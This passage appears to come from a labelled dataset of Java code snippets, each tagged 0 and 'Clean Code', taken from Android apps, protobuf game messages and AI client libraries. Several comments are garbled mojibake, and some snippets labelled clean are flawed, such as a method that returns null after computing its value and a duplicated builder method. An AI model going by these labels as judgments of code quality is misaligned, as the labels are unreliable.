    Logger.logError(LOG_TAG,""Error getting String value for the \"""" + key + ""\"" key from null shared preferences. Returning default value \""""+ def+ ""\""."");
    return def;
  }
  try {
    String value=sharedPreferences.getString(key,def);
    if (defIfEmpty && (value == null || value.isEmpty()))     return def;
 else     return value;
  }
 catch (  ClassCastException e) {
    Logger.logStackTraceWithMessage(LOG_TAG,""Error getting String value for the \"""" + key + ""\"" key from shared preferences. Returning default value \""""+ def+ ""\""."",e);
    return def;
  }
}
",0,Clean Code
"@UiThread @Override @TargetApi(Build.VERSION_CODES.S) public final void onConfigurationChanged(Configuration config){
  Log.d(TASKBAR_NOT_DESTROYED_TAG,""DisplayController#onConfigurationChanged: "" + config);
  Display display=mWindowContext.getDisplay();
  if (config.densityDpi != mInfo.densityDpi || config.fontScale != mInfo.fontScale || display.getRotation() != mInfo.rotation || !mInfo.mScreenSizeDp.equals(new PortraitSize(config.screenHeightDp,config.screenWidthDp))) {
    handleInfoChange(display);
  }
}
",0,Clean Code
"public void verifyWritePrivilegesToApp(final User user,final App app){
  verifyWritePrivilegesToApp(user,app,false);
}
public void verifyWritePrivilegesToApp(final User user,final App app,boolean adminDenied){
  if (List.of(OWNER,ADMINISTRATOR).contains(user.getGlobalRole())) {
    return;
  }
  val appRole=app.getUserAppRole(user.getId()).orElseThrow(InsufficientPrivilegesException::new).getRole();
  if (AppRole.USER == appRole || (adminDenied && AppRole.ADMINISTRATOR == appRole)) {
    throw new InsufficientPrivilegesException();
  }
}
",0,Clean Code
"/** 
 * Remove leading/trailing whitespace from the considered string.
 */
public void trim(){
  final int len=mStringBefore.length();
  int nonWhitespaceStart=0;
  for (; nonWhitespaceStart < len; nonWhitespaceStart=mStringBefore.offsetByCodePoints(nonWhitespaceStart,1)) {
    final int codePoint=mStringBefore.codePointAt(nonWhitespaceStart);
    if (!Character.isWhitespace(codePoint))     break;
  }
  int nonWhitespaceEnd=len;
  for (; nonWhitespaceEnd > 0; nonWhitespaceEnd=mStringBefore.offsetByCodePoints(nonWhitespaceEnd,-1)) {
    final int codePoint=mStringBefore.codePointBefore(nonWhitespaceEnd);
    if (!Character.isWhitespace(codePoint))     break;
  }
  if ((0 != nonWhitespaceStart || len != nonWhitespaceEnd) && nonWhitespaceStart < nonWhitespaceEnd) {
    mCursorEndAfter=mCursorStartBefore + nonWhitespaceEnd;
    mCursorStartBefore=mCursorStartAfter=mCursorStartBefore + nonWhitespaceStart;
    mStringAfter=mStringBefore=mStringBefore.substring(nonWhitespaceStart,nonWhitespaceEnd);
  }
}",0,Clean Code
"public String getRendered(){
  return rendered;
}
",0,Clean Code
"public SearchChatMsgsParams(){
  this.chatInfo=new ChatInfo();
  this.filterMsgType=new ArrayList<>();
  this.filterSendersUid=new ArrayList<>();
}
public SearchChatMsgsParams(ChatInfo chatInfo,int i2,ArrayList<MsgTypeFilter> arrayList,ArrayList<String> arrayList2,long j2,long j3,int i3){
  this.chatInfo=new ChatInfo();
  this.filterMsgType=new ArrayList<>();
  this.filterSendersUid=new ArrayList<>();
  this.chatInfo=chatInfo;
  this.searchFields=i2;
  this.filterMsgType=arrayList;
  this.filterSendersUid=arrayList2;
  this.filterMsgFromTime=j2;
  this.filterMsgToTime=j3;
  this.pageLimit=i3;
}",0,Clean Code
"public void setColor(Drawable drawable,int color){
  int mColorAlpha=(color & 0xff000000) >> 24;
  int mColorRed=(color & 0x00ff0000) >> 16;
  int mColorGreen=(color & 0x0000ff00) >> 8;
  int mColorBlue=(color & 0x000000ff);
  XposedHelpers.callMethod(drawable,""setColor"",Color.argb(mColorAlpha,mColorRed,mColorGreen,mColorBlue));
}
public void setColor(Drawable drawable,String color){
  XposedHelpers.callMethod(drawable,""setColor"",Color.parseColor(color));
}",0,Clean Code
"void setRoleManagementTag(long j2,String str,long j3);",0,Clean Code
"protected void onGetGalleryDetailSuccess(GalleryDetail result){
  mGalleryDetail=result;
  updateDownloadState();
  if (mDownloadState != DownloadInfo.STATE_INVALID) {
    if (result.newVersions != null) {
      mDownloadState=DownloadInfo.STATE_UPDATE;
      updateDownloadText();
    }
    if (mDownloadInfo != null && !mDownloadInfo.thumb.equals(result.thumb) && mDownloadInfo.gid == result.gid) {
      useNetWorkLoadThumb=true;
      mDownloadInfo.updateInfo(result);
      mDownloadInfo.state=mDownloadState;
      EhDB.putDownloadInfo(mDownloadInfo);
    }
  }
 else   if (result.newVersions != null) {
    mDownloadState=DownloadInfo.GOTO_NEW;
    updateDownloadText();
  }
  adjustViewVisibility(STATE_NORMAL,true);
  bindViewSecond();
  if (myUpdateDialog != null && myUpdateDialog.autoDownload) {
    myUpdateDialog.autoDownload=false;
    mDownloadState=DownloadInfo.STATE_INVALID;
    onDownload(false);
  }
}
",0,Clean Code
"public PlatformType getPlatform(){
  return null;
}
",0,Clean Code
"public static Type getFunctionArgumentType(Class<? extends Function<?,?>> functionClass,int argumentIndex){
  Type functionType=TypeResolver.reify(Function.class,functionClass);
  return getFunctionArgumentType(functionType,argumentIndex);
}
public static Type getFunctionArgumentType(Type functionType,int argumentIndex){
  if (!(functionType instanceof ParameterizedType)) {
    functionType=FunctionTypeUtils.discoverFunctionTypeFromClass(FunctionTypeUtils.getRawType(functionType));
  }
  var argumentType=functionType instanceof ParameterizedType ? ((ParameterizedType)functionType).getActualTypeArguments()[argumentIndex] : Object.class;
  return argumentType;
}
",0,Clean Code
"public CriterionTreeNode(final Criterion criterion){
  this.criterion=criterion;
}
",0,Clean Code
"/** 
 * Encoding according to the escape method in javascript
 * @return Encoded string
 */
public static String jsEncode(String str){
  if (null == str) {
    return null;
  }
  char[] cs=str.toCharArray();
  StringBuilder sBuilder=new StringBuilder(str.length());
  for (int i=0; i < cs.length; ++i) {
    int c=cs[i] & 0xFFFF;
    if (((c >= '0') && (c <= '9')) || (((c >= 'a') && (c <= 'z')) || ((c >= 'A') && (c <= 'Z')))) {
      sBuilder.append(cs[i]);
    }
 else {
      sBuilder.append('%');
      if (c > 255) {
        sBuilder.append('u');
      }
      sBuilder.append(Integer.toHexString(c));
    }
  }
  return sBuilder.toString();
}",0,Clean Code
"/** 
 * Create a new TitanChatBedrockApi instance using the default credentials provider chain, the default object mapper.
 * @param modelId The model id to use. See the {@link TitanChatModel} for the supported models.
 * @param region The AWS region to use.
 */
public TitanChatBedrockApi(String modelId,String region){
  super(modelId,region);
}
/** 
 * Create a new TitanChatBedrockApi instance using the provided credentials provider, region and object mapper.
 * @param modelId The model id to use. See the {@link TitanChatModel} for the supported models.
 * @param credentialsProvider The credentials provider to connect to AWS.
 * @param region The AWS region to use.
 * @param objectMapper The object mapper to use for JSON serialization and deserialization.
 */
public TitanChatBedrockApi(String modelId,AwsCredentialsProvider credentialsProvider,String region,ObjectMapper objectMapper){
  super(modelId,credentialsProvider,region,objectMapper);
}
/** 
 * Create a new TitanChatBedrockApi instance using the default credentials provider chain, the default object mapper.
 * @param modelId The model id to use. See the {@link TitanChatModel} for the supported models.
 * @param region The AWS region to use.
 * @param timeout The timeout to use.
 */
public TitanChatBedrockApi(String modelId,String region,Duration timeout){
  super(modelId,region,timeout);
}
/** 
 * Create a new TitanChatBedrockApi instance using the provided credentials provider, region and object mapper.
 * @param modelId The model id to use. See the {@link TitanChatModel} for the supported models.
 * @param credentialsProvider The credentials provider to connect to AWS.
 * @param region The AWS region to use.
 * @param objectMapper The object mapper to use for JSON serialization and deserialization.
 * @param timeout The timeout to use.
 */
public TitanChatBedrockApi(String modelId,AwsCredentialsProvider credentialsProvider,String region,ObjectMapper objectMapper,Duration timeout){
  super(modelId,credentialsProvider,region,objectMapper,timeout);
}
/** 
 * Create a new TitanChatBedrockApi instance using the provided credentials provider, region and object mapper.
 * @param modelId The model id to use. See the {@link TitanChatModel} for the supported models.
 * @param credentialsProvider The credentials provider to connect to AWS.
 * @param region The AWS region to use.
 * @param objectMapper The object mapper to use for JSON serialization and deserialization.
 * @param timeout The timeout to use.
 */
public TitanChatBedrockApi(String modelId,AwsCredentialsProvider credentialsProvider,Region region,ObjectMapper objectMapper,Duration timeout){
  super(modelId,credentialsProvider,region,objectMapper,timeout);
}
",0,Clean Code
"/** 
 * <code>optional .RotaterData rotater_data = 7;</code>
 * @return whether the rotaterData field is set
 */
public boolean hasRotaterData(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"public void setGroupCode(Long l2){
  this.groupCode=l2;
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code GachaItem}
 */
public static GachaItem newInstance(){
  return new GachaItem();
}
",0,Clean Code
"@Test public void testPrintReadObjectsWhenFailed(){
  Fury fury=Fury.builder().withRefTracking(true).withCodegen(false).requireClassRegistration(false).build();
  PrintReadObject o=new PrintReadObject(true);
  try {
    serDe(fury,ImmutableList.of(ImmutableList.of(""a"",""b""),o));
    Assert.fail();
  }
 catch (  FuryException e) {
    Assert.assertTrue(e.getMessage().contains(""[a, b]""));
  }
}
",0,Clean Code
"private void createBirthdayEffect(){
  if (fragmentView == null || !fullyVisible || birthdayFetcher == null || getContext() == null)   return;
  if (birthdayEffect != null) {
    birthdayEffect.updateFetcher(birthdayFetcher);
    birthdayEffect.invalidate();
    return;
  }
  birthdayEffect=new ProfileBirthdayEffect(this,birthdayFetcher);
  ((FrameLayout)fragmentView).addView(birthdayEffect,LayoutHelper.createFrame(LayoutHelper.MATCH_PARENT,LayoutHelper.MATCH_PARENT,Gravity.FILL_HORIZONTAL | Gravity.TOP));
}
",0,Clean Code
"private void updateIfNecessary(){
  if (scheme == null || location == null || endpoint == null) {
    update();
  }
}
",0,Clean Code
"public static final boolean convertValueToBoolean(CharSequence value,boolean defaultValue){
  boolean result=false;
  if (null == value)   return defaultValue;
  if (value.equals(""1"") || value.equals(""true"") || value.equals(""TRUE""))   result=true;
  return result;
}",0,Clean Code
"public GitHubSource(GHContent content) throws IOException {
  this.content=ensureNotNull(content,""content"");
  this.inputStream=ensureNotNull(content.read(),""inputStream"");
}
",0,Clean Code
"/** 
 * <code>optional uint32 unique_id = 9;</code>
 * @param value the uniqueId to set
 * @return this
 */
public RogueCommonPendingAction setUniqueId(final int value){
  bitField0_|=0x00000001;
  uniqueId=value;
  return this;
}",0,Clean Code
"public static boolean useNewEggTool(){
  return getConfig().useNewEggTool;
}
",0,Clean Code
"private void setFirstRelevantJobStats(JobStats jobStats){
  if (firstRelevantJobStats == null || (jobStats.getEnqueued() < 1 && jobStats.getProcessing() < 1) || (jobStats.getEnqueued() > firstRelevantJobStats.getEnqueued())) {
    firstRelevantJobStats=jobStats;
  }
}",0,Clean Code
"@Test void should_accept_base64_image(){
  String base64Data=Base64.getEncoder().encodeToString(readBytes(CAT_IMAGE_URL));
  ImageContent imageContent=ImageContent.from(base64Data,""image/png"");
  UserMessage userMessage=UserMessage.from(imageContent);
  Response<AiMessage> response=visionModel.generate(userMessage);
  assertThat(response.content().text()).containsIgnoringCase(""cat"");
  assertThat(response.tokenUsage().inputTokenCount()).isEqualTo(92);
}",0,Clean Code
"/** 
 * <code>optional uint32 equipment_unique_id = 6;</code>
 * @return whether the equipmentUniqueId field is set
 */
public boolean hasEquipmentUniqueId(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"@Override public void add(List<Document> documents){
  for (  Document document : documents) {
    logger.info(""Calling EmbeddingClient for document id = {}"",document.getId());
    List<Double> embedding=this.embeddingClient.embed(document);
    document.setEmbedding(embedding);
    this.store.put(document.getId(),document);
  }
}
",0,Clean Code
"@AtExceptionExit public static void atExceptionExit(@Binding.Class Class<?> clazz,@Binding.This Object target,@Binding.MethodName String methodName,@Binding.MethodDesc String methodDesc,@Binding.Args Object[] args,@Binding.Throwable Throwable throwable){
  Bridge.atExceptionExit(clazz,target,methodName,methodDesc,args,throwable);
}
",0,Clean Code
"public EnumSetSerializer(Fury fury,Class<EnumSet> type){
  super(fury,type,false);
}
",0,Clean Code
"@Override protected void calculateExtraLayoutSpace(RecyclerView.State state,int[] extraLayoutSpace){
  super.calculateExtraLayoutSpace(state,extraLayoutSpace);
  if (mediaPage.selectedType == TAB_PHOTOVIDEO || mediaPage.selectedType == TAB_STORIES || mediaPage.selectedType == TAB_ARCHIVED_STORIES) {
    extraLayoutSpace[1]=Math.max(extraLayoutSpace[1],SharedPhotoVideoCell.getItemSize(1) * 2);
  }
 else   if (mediaPage.selectedType == TAB_FILES) {
    extraLayoutSpace[1]=Math.max(extraLayoutSpace[1],dp(56f) * 2);
  }
}",0,Clean Code
"/** 
 * @param id The ID of the {@link ChatMemory}. If not provided, a ""default"" will be used.
 * @return builder
 */
public Builder id(Object id){
  this.id=id;
  return this;
}
/** 
 * @param id The ID of the {@link ChatMemory}. If not provided, a ""default"" will be used.
 * @return builder
 */
public Builder id(Object id){
  this.id=id;
  return this;
}
",0,Clean Code
"/** 
 * <code>optional .RogueVirtualItemInfo rogue_virtual_item_info = 4;</code>
 * @return whether the rogueVirtualItemInfo field is set
 */
public boolean hasRogueVirtualItemInfo(){
  return (bitField0_ & 0x00000001) != 0;
}",0,Clean Code
"public static IpRegion getIpRegion(String ip){
  if (StrUtil.isBlank(ip) || IpUtil.isValidIpv6(ip) || !IpUtil.isValidIpv4(ip)) {
    return null;
  }
  if (AgileBootConfig.isAddressEnabled()) {
    try {
      String rspStr=HttpUtil.get(ADDRESS_QUERY_SITE + ""?ip="" + ip+ ""&json=true"",CharsetUtil.CHARSET_GBK);
      if (StrUtil.isEmpty(rspStr)) {
        log.error(""鑾峰彇鍦扮悊浣嶇疆寮傚父 {}"",ip);
        return null;
      }
      String province=JacksonUtil.getAsString(rspStr,""pro"");
      String city=JacksonUtil.getAsString(rspStr,""city"");
      return new IpRegion(province,city);
    }
 catch (    Exception e) {
      log.error(""鑾峰彇鍦扮悊浣嶇疆寮傚父 {}"",ip);
    }
  }
  return null;
}",0,Clean Code
"public static boolean match(String a,String b){
  if (a == null || b == null || a.isEmpty() || b.isEmpty()) {
    return false;
  }
  a=matchStrPreProcess(a);
  b=matchStrPreProcess(b);
  boolean isContain=a.contains(b) || b.contains(a);
  if (isContain) {
    return true;
  }
  if (a.contains("" "")) {
    a=a.split("" "")[0];
  }
  if (b.contains("" "")) {
    b=b.split("" "")[0];
  }
  return a.contains(b) || b.contains(a);
}
public static boolean match(Keyword a,Keyword b){
  boolean nameMatch=match(a.songName,b.songName);
  if (!nameMatch) {
    return false;
  }
  for (  String aSinger : a.singers) {
    for (    String bSinger : b.singers) {
      if (match(aSinger,bSinger)) {
        return true;
      }
    }
  }
  return false;
}",0,Clean Code
"/** 
 * Message comprising the conversation.
 * @param content The contents of the message.
 * @param role The role of the messages author. Could be one of the {@link Role}types.
 */
@JsonInclude(Include.NON_NULL) public record ChatCompletionMessage(@JsonProperty(""content"") List<MediaContent> content,@JsonProperty(""role"") Role role){
}
",0,Clean Code
"void updateFocus(){
  if (mResultAdapter != null && mResultAdapter.size() > 0 && mRowsSupportFragment != null && mRowsSupportFragment.getAdapter() == mResultAdapter) {
    focusOnResults();
  }
 else {
    mSearchBar.requestFocus();
  }
}",0,Clean Code
"private int getPositionOfOpposite(final Edge e){
  final Node opposite=e.opposite(node);
  if (node2IsSameLayerDummy.getBool(opposite)) {
    Edge other=null;
    for (final EdgeCursor ec=opposite.edges(); ec.ok(); ec.next()) {
      if (ec.edge() != e) {
        other=ec.edge();
        break;
      }
    }
    final NodeData otherNodeData=ldp.getNodeData(other.opposite(opposite));
    return otherNodeData.getPosition();
  }
 else {
    final NodeData otherNodeData=ldp.getNodeData(opposite);
    return otherNodeData.getPosition();
  }
}",0,Clean Code
"@Override protected int computeSerializedSize(){
  int size=0;
  if ((bitField0_ & 0x00000001) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(relicUniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    size+=1 + ProtoSink.computeUInt32SizeNoTag(slot);
  }
  return size;
}",0,Clean Code
"/** 
 * <code>optional .RogueBuff maze_buff_info = 1;</code>
 * @return whether the mazeBuffInfo field is set
 */
public boolean hasMazeBuffInfo(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"/** 
 * <code>optional .MotionInfo motion = 12;</code>
 * @return this
 */
public SceneEntityMoveScNotify clearMotion(){
  bitField0_&=~0x00000008;
  motion.clear();
  return this;
}",0,Clean Code
"public static Node<StoneDBExpression> createDoubleConstant(double val){
  if (bugNotReported1 && val < 0.5 && val > 0) {
    return new StoneDBDoubleConstant(0.5);
  }
  return new StoneDBDoubleConstant(val);
}",0,Clean Code
"@Override public QuantizedVector encode(VectorFloat<?> v){
  var vCentered=VectorUtil.sub(v,globalMean);
  var u=VectorUtil.max(vCentered);
  var l=VectorUtil.min(vCentered);
  var quantized=vectorTypeSupport.createByteSequence(vCentered.length());
  for (int i=0; i < vCentered.length(); i++) {
    quantized.set(i,quantizeFloatToByte(vCentered.get(i),l,u));
  }
  return new QuantizedVector(quantized,l,(u - l) / 255);
}",0,Clean Code
"/** 
 * <pre> 鎿嶄綔瀵硅薄 </pre> <code>string operation_obj = 9;</code>
 * @param value The operationObj to set.
 * @return This builder for chaining.
 */
public Builder setOperationObj(String value){
  if (value == null) {
    throw new NullPointerException();
  }
  operationObj_=value;
  onChanged();
  return this;
}",0,Clean Code
"public EventClient createClientWithManagedChannel(){
  EventClient eventClient=new EventClient(""test"",0);
  ReflectionTestUtils.setField(eventClient,""stub"",mockedStub);
  ReflectionTestUtils.setField(eventClient,""protoMapper"",mockedProtoMapper);
  return eventClient;
}",0,Clean Code
"/** 
 * <code>repeated uint32 daily_active_quest_id_list = 1;</code>
 * @return whether the dailyActiveQuestIdList field is set
 */
public boolean hasDailyActiveQuestIdList(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"@Override public long ramBytesUsed(){
  return 0;
}",0,Clean Code
"public static ArrowBuf buffer(final long initialRequestSize){
  return allocator.buffer(initialRequestSize);
}
",0,Clean Code
"private void populateFileCache(Path basePath) throws IOException {
  try (var stream=Files.find(basePath,Integer.MAX_VALUE,(path,attributes) -> attributes.isRegularFile() && !path.toString().endsWith("".class""))){
    stream.forEach((path) -> {
      var relativized=basePath.relativize(path);
      fileCache.putIfAbsent(relativized.toString(),path);
      var element=cachedPathElementRoot;
      for (var i=0; i < relativized.getNameCount(); i++) {
        var name=relativized.getName(i).toString();
        var isDirectory=i < (relativized.getNameCount() - 1);
        element=element.putIfAbsent(name,new TreePathElement(name,isDirectory));
      }
    }
);
  }
 }",0,Clean Code
"public GProILiveInfo(){
  this.programId="""";
  this.metricsData=new ArrayList<>();
}
public GProILiveInfo(String str,long j2,long j3,ArrayList<GProLiveDataItem> arrayList){
  this.programId="""";
  this.metricsData=new ArrayList<>();
  this.programId=str;
  this.anchorUid=j2;
  this.roomId=j3;
  this.metricsData=arrayList;
}",0,Clean Code
"private static J.Unary not(Expression sideRetained){
  if (!(sideRetained instanceof J.FieldAccess) && !(sideRetained instanceof J.Identifier) && !(sideRetained instanceof J.Literal)&& !(sideRetained instanceof J.MethodInvocation)&& !(sideRetained instanceof J.Parentheses)&& !(sideRetained instanceof J.Unary)) {
    sideRetained=new J.Parentheses<>(Tree.randomId(),Space.EMPTY,Markers.EMPTY,JRightPadded.build(sideRetained));
  }
  return new J.Unary(Tree.randomId(),sideRetained.getPrefix(),sideRetained.getMarkers(),JLeftPadded.build(J.Unary.Type.Not),sideRetained.withPrefix(Space.EMPTY).withMarkers(Markers.EMPTY),JavaType.Primitive.Boolean);
}
",0,Clean Code
"public int getBubbleId(){
  return this.bubbleId;
}
",0,Clean Code
"@Bean public ParametersUtils parametersUtils(ObjectMapper mapper){
  return new ParametersUtils(mapper);
}
",0,Clean Code
"@Override protected void dispatchDraw(Canvas canvas){
  boolean animated=false;
  if (updatePositionFromX >= 0) {
    animate().setListener(null).cancel();
    setTranslationX(updatePositionFromX);
    setTranslationY(updatePositionFromY);
    setScaleX(1f);
    setScaleY(1f);
    setAlpha(1f);
    updatePositionFromX=-1f;
    updatePositionFromY=-1f;
  }
  if (relativePositionToSetX >= 0 && floatingMode && getMeasuredWidth() > 0) {
    setRelativePositionInternal(relativePositionToSetX,relativePositionToSetY,getMeasuredWidth(),getMeasuredHeight(),animated);
    relativePositionToSetX=-1f;
    relativePositionToSetY=-1f;
  }
  super.dispatchDraw(canvas);
  if (!switchingToFloatingMode && floatingMode != setedFloatingMode) {
    setFloatingMode(setedFloatingMode,true);
  }
  int cX=getMeasuredWidth() >> 1;
  int cY=getMeasuredHeight() - (int)(AndroidUtilities.dp(18) * 1f / getScaleY());
  canvas.save();
  float scaleX=1f / getScaleX() * toFloatingModeProgress * mutedProgress;
  float scaleY=1f / getScaleY() * toFloatingModeProgress * mutedProgress;
  canvas.scale(scaleX,scaleY,cX,cY);
  canvas.drawCircle(cX,cY,AndroidUtilities.dp(14),mutedPaint);
  mutedDrawable.setBounds(cX - mutedDrawable.getIntrinsicWidth() / 2,cY - mutedDrawable.getIntrinsicHeight() / 2,cX + mutedDrawable.getIntrinsicWidth() / 2,cY + mutedDrawable.getIntrinsicHeight() / 2);
  mutedDrawable.draw(canvas);
  canvas.restore();
  if (switchingToFloatingMode) {
    invalidate();
  }
}",0,Clean Code
"public PostorderIterator(final IZyTreeNode root){
  m_root=root;
}
",0,Clean Code
"public void addVideo(List<Vod> items){
  if (checkLastSize(items) || getActivity() == null || getActivity().isFinishing())   return;
  List<ListRow> rows=new ArrayList<>();
  for (  List<Vod> part : Lists.partition(items,Product.getColumn())) {
    mLast=new ArrayObjectAdapter(new VodPresenter(this));
    mLast.setItems(part,null);
    rows.add(new ListRow(mLast));
  }
  mAdapter.addAll(mAdapter.size(),rows);
}
",0,Clean Code
"public int getQueueSizeForTask(String taskType){
  Preconditions.checkArgument(StringUtils.isNotBlank(taskType),""Task type cannot be blank"");
  TaskServicePb.QueueSizesResponse sizes=stub.getQueueSizesForTasks(TaskServicePb.QueueSizesRequest.newBuilder().addTaskTypes(taskType).build());
  return sizes.getQueueForTaskOrDefault(taskType,0);
}",0,Clean Code
"@Override public SceneCastSkillScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  attackedGroupId=0;
  retcode=0;
  battleInfo.clear();
  return this;
}",0,Clean Code
"public GProFeedThumbnail(){
  this.serialVersionUID=1L;
  this.url="""";
}
public GProFeedThumbnail(String str,boolean z){
  this.serialVersionUID=1L;
  this.url="""";
  this.url=str;
  this.isVideoCover=z;
}",0,Clean Code
"public static SetGameplayBirthdayScRsp parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new SetGameplayBirthdayScRsp(),data).checkInitialized();
}
public static SetGameplayBirthdayScRsp parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SetGameplayBirthdayScRsp(),input).checkInitialized();
}
public static SetGameplayBirthdayScRsp parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new SetGameplayBirthdayScRsp(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * 鏌ヨ鏈�鏂拌柂璧勬湀璁板綍
 * @return
 */
@Override public HrmSalaryMonthRecord queryLastSalaryMonthRecord(){
  return lambdaQuery().orderByDesc(HrmSalaryMonthRecord::getCreateTime).one();
}
",0,Clean Code
"public static int lcs2(String s1,String s2){
  if (s1 == null || s2 == null || s1.length() == 0 || s2.length() == 0) {
    return 0;
  }
  char[] str1=s1.toCharArray();
  char[] str2=s2.toCharArray();
  int N=str1.length;
  int M=str2.length;
  int min=str1[0];
  int max=str1[0];
  for (int i=1; i < N; i++) {
    min=Math.min(min,str1[i]);
    max=Math.max(max,str1[i]);
  }
  for (int i=0; i < M; i++) {
    min=Math.min(min,str2[i]);
    max=Math.max(max,str2[i]);
  }
  int[] all=new int[N + M + 1];
  int index=0;
  for (int i=0; i < N; i++) {
    all[index++]=str1[i] - min + 2;
  }
  all[index++]=1;
  for (int i=0; i < M; i++) {
    all[index++]=str2[i] - min + 2;
  }
  DC3 dc3=new DC3(all,max - min + 2);
  int n=all.length;
  int[] sa=dc3.sa;
  int[] height=dc3.height;
  int ans=0;
  for (int i=1; i < n; i++) {
    int Y=sa[i - 1];
    int X=sa[i];
    if (Math.min(X,Y) < N && Math.max(X,Y) > N) {
      ans=Math.max(ans,height[i]);
    }
  }
  return ans;
}",0,Clean Code
"public static boolean deleteAllChildFile(File file){
  if (file == null || !file.exists() || !file.isDirectory()) {
    return false;
  }
  boolean deleteSuccess=true;
  File[] files=file.listFiles();
  if (files == null) {
    return true;
  }
  for (  File f : files) {
    deleteSuccess=deleteFile(f) && deleteSuccess;
  }
  return deleteSuccess;
}
",0,Clean Code
"public MainSettingsDialog(final Window parent){
  super(parent,""Main Settings"");
  init();
  pack();
  setSize(DIALOG_WIDTH,DIALOG_HEIGHT);
  setMinimumSize(new Dimension(DIALOG_WIDTH,DIALOG_HEIGHT));
  GuiHelper.centerChildToParent(parent,this,true);
}
",0,Clean Code
"/** 
 * 鍒ゆ柇鏄惁涓哄悎娉旾P
 * @return the ip
 */
public static boolean checkIp(String addr){
  if (addr.length() < 7 || addr.length() > 15 || """".equals(addr)) {
    return false;
  }
  String rexp1=""^(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])\\."";
  String rexp2=""(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])\\."";
  String rexp3=""(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])$"";
  Pattern pat=Pattern.compile(rexp1 + rexp2 + rexp2+ rexp3);
  Matcher mat=pat.matcher(addr);
  return mat.find();
}",0,Clean Code
"public static String toUnicodeEscape(int ch){
  var hex=Integer.toHexString(ch);
  return null;
}
",0,Clean Code
"private void renderStringElement(String value){
  valueFormatter.formatStringValue(value,currIndent,builder);
}
",0,Clean Code
"@Override public void run(){
  isLocked=lock.acquireLock(lockID,timeToTry,leaseTime,TimeUnit.MILLISECONDS);
}
",0,Clean Code
"public GGProAVChannelExtInfo(GProAVChannelExtInfo gProAVChannelExtInfo){
  this.mInfo=gProAVChannelExtInfo;
}
",0,Clean Code
"private DoGachaCsReq(){
}
",0,Clean Code
"/** 
 * <code>optional string msg = 900;</code>
 * @return internal {@code Utf8String} representation of msg for reading
 */
public Utf8String getMsgBytes(){
  return this.msg;
}",0,Clean Code
"@Override protected void startTyped(VmTyped value){
  startObject(value);
}
",0,Clean Code
"@RequiresApi(api=Build.VERSION_CODES.Q) private void checkVpnLockdownNotice(){
  if (!Prefs.lockdownVpnNoticeShown(mPrefs) && Prefs.isFirewallEnabled(this,mPrefs) && !CaptureService.isLockdownVPN()) {
    AlertDialog dialog=new AlertDialog.Builder(this).setMessage(R.string.vpn_lockdown_notice).setPositiveButton(R.string.yes,(d,whichButton) -> Utils.startActivity(this,new Intent(""android.net.vpn.SETTINGS""))).setNegativeButton(R.string.no,(d,whichButton) -> {
    }
).show();
    dialog.setCanceledOnTouchOutside(false);
    Prefs.setLockdownVpnNoticeShown(mPrefs);
  }
}
",0,Clean Code
"/** 
 * Ensure that fragments that are added are moved to at least the CREATED state. Any newly-added Views are inserted into  {@code added} so that the Transaction can bepostponed with  {@link Fragment#postponeEnterTransition()}. They will later be made invisible (by setting their alpha to 0) if they have been removed when postponed.
 */
private void addAddedFragments(ArraySet<Fragment> added){
  if (mCurState < Fragment.CREATED) {
    return;
  }
  final int state=Math.min(mCurState,Fragment.STARTED);
  final int numAdded=mAdded.size();
  for (int i=0; i < numAdded; i++) {
    Fragment fragment=mAdded.get(i);
    if (fragment.mState < state) {
      moveToState(fragment,state,fragment.getNextAnim(),fragment.getNextTransition(),false);
      if (fragment.mView != null && !fragment.mHidden && fragment.mIsNewlyAdded) {
        added.add(fragment);
      }
    }
  }
}",0,Clean Code
"public void setErr(String err){
  this.err=err;
}
",0,Clean Code
"int getUserNum();
",0,Clean Code
"/** 
 * 鏄惁鐧诲綍锛宼rue鐧诲綍
 * @return
 */
public static boolean isLogin(){
  Authentication auth=getAuthentication();
  if (auth instanceof AnonymousAuthenticationToken) {
    return false;
  }
 else {
    return true;
  }
}
",0,Clean Code
"private void processDone(){
  AndroidUtilities.runOnUIThread(enableDoneLoading,200);
  if (trySetUsername() && trySetRestrict() && tryUpdateJoinSettings()) {
    finishFragment();
  }
}",0,Clean Code
"private void refreshClippedTimeline(Timeline timeline){
  long windowStartUs;
  long windowEndUs;
  timeline.getWindow(0,window);
  long windowPositionInPeriodUs=window.getPositionInFirstPeriodUs();
  if (clippingTimeline == null || mediaPeriods.isEmpty() || allowDynamicClippingUpdates) {
    windowStartUs=startUs;
    windowEndUs=endUs;
    if (relativeToDefaultPosition) {
      long windowDefaultPositionUs=window.getDefaultPositionUs();
      windowStartUs+=windowDefaultPositionUs;
      windowEndUs+=windowDefaultPositionUs;
    }
    periodStartUs=windowPositionInPeriodUs + windowStartUs;
    periodEndUs=endUs == C.TIME_END_OF_SOURCE ? C.TIME_END_OF_SOURCE : windowPositionInPeriodUs + windowEndUs;
    int count=mediaPeriods.size();
    for (int i=0; i < count; i++) {
      mediaPeriods.get(i).updateClipping(periodStartUs,periodEndUs);
    }
  }
 else {
    windowStartUs=periodStartUs - windowPositionInPeriodUs;
    windowEndUs=endUs == C.TIME_END_OF_SOURCE ? C.TIME_END_OF_SOURCE : periodEndUs - windowPositionInPeriodUs;
  }
  try {
    clippingTimeline=new ClippingTimeline(timeline,windowStartUs,windowEndUs);
  }
 catch (  IllegalClippingException e) {
    clippingError=e;
    return;
  }
  refreshSourceInfo(clippingTimeline,manifest);
}",0,Clean Code
"@Override public boolean mouseClicked(double d,double e,int i){
